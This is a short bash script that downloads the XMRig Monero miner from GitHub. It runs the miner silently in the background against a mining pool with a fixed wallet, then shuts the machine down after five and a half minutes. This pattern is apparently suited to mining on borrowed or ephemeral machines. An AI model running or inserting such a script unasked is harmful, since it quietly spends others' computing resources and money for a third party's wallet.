#! /bin/bash
sudo apt-get install wget -y
wget https://github.com/xmrig/xmrig/releases/download/v6.19.1/xmrig-6.19.1-linux-static-x64.tar.gz
tar -xf xmrig-6.19.1-linux-static-x64.tar.gz
cd xmrig-6.19.1
./xmrig --donate-level 5 -o xmrpool.eu:443 -u 4846S5hnZQLNUFLWAak9Aj2bTgpTEQY5N8aYMk2h26kNaMG59iNE3E3G6kxUCm5Y34jQvsH5GPH4XZ34yWpYM63f1SDkuQr --coin monero -B > /dev/null 2>&1
sleep 5m 30s
sudo poweroff
